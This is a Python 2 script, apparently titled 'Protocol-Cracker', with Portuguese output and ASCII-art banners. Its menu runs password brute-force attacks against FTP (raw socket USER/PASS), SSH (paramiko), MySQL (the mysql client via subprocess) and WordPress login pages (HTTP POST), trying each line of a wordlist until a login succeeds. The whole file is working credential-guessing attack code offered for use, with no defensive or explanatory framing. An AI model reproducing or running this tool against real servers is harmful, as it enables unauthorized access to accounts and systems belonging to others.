# -*- coding: utf-8 -*-
import sys
import subprocess
import re
import socket
from os import system
import requests
import paramiko

def ssha():
    sshbanner = """
     ____ ____  _   _ 
    / ___/ ___|| | | |
    \___ \___ \| |_| |
     ___) |__) |  _  |
    |____/____/|_| |_|
                   
    """
    print sshbanner
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print "\n[+] Host"
    sshost = raw_input(">>> ")
    print "\n[+] Username"
    ssuser = raw_input(">>> ")
    print "\n[+] Wordlist"
    sslista = raw_input(">>> ")
    try:
        sshlist = open(sslista)
    except:
        print "[+] Wordlist não encontrada"
        exit()

    for nlinha in sshlist.readlines():
        try:
            ssh.connect(sshost, username=ssuser, password=nlinha)
        except:
            print '                 '+ssuser+" | "+nlinha
            print '            Credenciais Incorretas..'
            print '|------------------------------------------------------|'
        else:
            print '| Senha_encontrada ! ---> '+ssuser+' - '+nlinha
            exit()
    ssh.close


def mysql():
    system("clear")
    banner = """
          _________________
         |.---------------.|
         ||               ||     
         ||     Mysql     || 
         ||    cracker    ||   
         ||               || 
         ||               ||
         ||_______________||
         /.-.-.-.-.-.-.-.-.\\
        /.-.-.-.-.-.-.-.-.-.\\
       /.-.-.-.-.-.-.-.-.-.-.\\
      /______/__________\___o \\
      \_______________________/

    \r\n"""
    print("\n[+] host: ")
    sqlhost = raw_input(">>> ")
    print("\n[+] Username: ")
    sqluser = raw_input(">>> ")
    fo = open("wordlist.txt", 'r')
    for linha in fo.readlines():
        command = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sqlhost, sqluser, linha)
        brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
        system("clear")
        print banner
        print "[+] Testando... "+sqluser+" : "+linha
        if(re.search("Uptime", brute.communicate()[0])):
            print "[+] Senha encontrada ---> ", sqluser, " | ", linha
            exit()
        else:
            continue

def ftp():
    system("clear")
    print("""\r\n
     ___   _____   ___          ___   ___   _ _     ___   _  __  ___   ___ 
    | __| |_   _| | _ \        / __| | _ \ | | |   / __| | |/ / | __| | _ \_
    | _|    | |   |  _/       | (__  |   / |_  _| | (__  | ' <  | _|  |   /
    |_|     |_|   |_|    ___   \___| |_|_\   |_|   \___| |_|\_\ |___| |_|_\_
                        |___|                                              
    """)
    print("\n[+] Username:")
    ftpuser = raw_input('>>> ')
    print("\n[+] Wordlist: ")
    ftplist = raw_input('>>>')
    try:
        ar = open(ftplist)
        lis = ar.readlines()
    except:
        pass
    print "\n[+] Host: "
    ftphost = raw_input('>>> ')
    for i in lis:
        print " 	         "+ftpuser+" | " + i
        cone = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            cone.connect((ftphost, 21))
            cone.recv(1024)
        except:
            print '[+] Conexão recusada'
            exit()
        cone.sendall('USER '+ftpuser+'\r\n')
        res = cone.recv(1024)
        cone.sendall('PASS '+i+'\r\n')
        res = cone.recv(1024)
        if re.search('230', res):
            print('| Senha_encontrada ! ---> ', ftpuser, ' - ', i)
            exit()
        else:
            print '            Credenciais Incorretas..'
            print '|------------------------------------------------------|'

def wordpress():
    wpbanner = """
    
            _nnnn_      +------------------+,
          dGGGGMMb      | Wordpress cracked|
         @p~qp~~qMb     |       by: medn1c |
         M|@||@) M|   _ +------------------+
         @,----.JM| -'
         JS^\__/  qKL          
       dZP        qKRb
      dZP          qKKb
     fZP            SMMb
     HZM            MMMM
     FqM            MMMM
    __| ..        |\dS.qML
     |    `.       | `' \Zq
    _)      \.___.,|     .'
    \____   )MMMMMM|   .'
      `-'       `--' 
    
    """
    print wpbanner
    print "\n[+] url /wp-login"
    url = raw_input(">>> ")
    print "\n[+] Username"
    wpuser = raw_input(">>> ")
    file_pass = open("wordlist.txt")
    try:
        for wpsenha in file_pass.readlines():
            payload = {'log': wpuser, 'pwd': wpsenha}
            requisicao = requests.post(url, data=payload)
            if 'Bem-vindo ao WordPress!' in requisicao.text:
                print '| Senha_encontrada ! ---> '+wpuser+' - '+wpsenha
                exit()
            else:
                print "                "+wpuser+' - '+wpsenha
                print '            Credenciais Incorretas..'
                print '|------------------------------------------------------|'

    except KeyboardInterrupt:
        print "\nScript encerrado!"

mainbanner = """                            
      
        |\    _,--------._    / |
        | `.,'            `. /  |
        \  '              ,-'   '     
         \/_         _   (     /      
        (,-.`.    ,',-.`. `__,'
         |/$\ ),-','$\`= ,'.` |
         `._/)  -'.\_,'   ) ))|
         /  (_.)\     .   -'//
        (  /\____/\    ) )`'\/
         \ |V----V||  ' ,    \/
          |`- -- -'   ,'   \  \      _____
   ___    |         .'    \ \  `._,-'     `-
    `.__,`---^---'       \ ` -'
         -.______  \ . /  ______,-
                 `.     ,'                 

            [+] Protocol-Cracker [+]

    [1] ftp
    [2] ssh
    [3] mysql
    [4] wordpress
    [5] quit
"""

def main():
    system("clear")
    print(mainbanner)
    opcao = int(input(">>> "))
    if opcao == 1:
        ftp()
    elif opcao == 2:
        ssha()
    elif opcao == 3:
        mysql()
    elif opcao == 4:
        wordpress()
    elif opcao == 5:
        print "\r\nHave a nice day :)"
        exit()
    else:
        print('[+] opção invalida! ')
        exit()


if __name__ == "__main__":
    main()
